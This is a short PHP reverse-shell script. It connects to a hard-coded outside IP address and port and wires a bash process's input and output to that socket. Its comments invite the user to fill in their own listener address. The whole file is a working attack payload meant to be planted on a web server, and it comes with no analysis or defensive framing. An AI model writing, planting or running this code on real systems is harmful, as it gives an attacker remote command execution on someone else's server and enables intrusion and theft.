<?php
// Set your LHOST and LPORT here
$host = '107.175.243.19';  // Replace with your IP address
$port = 51000;    		   // Replace with your port number

// Create a socket connection
$sock = fsockopen($host, $port);
if ($sock) {
    // Open a process with bash and redirect input/output to the socket
    $proc = proc_open("bash", array(
        0 => $sock,  // stdin
        1 => $sock,  // stdout
        2 => $sock   // stderr
    ), $pipes);
}
?>
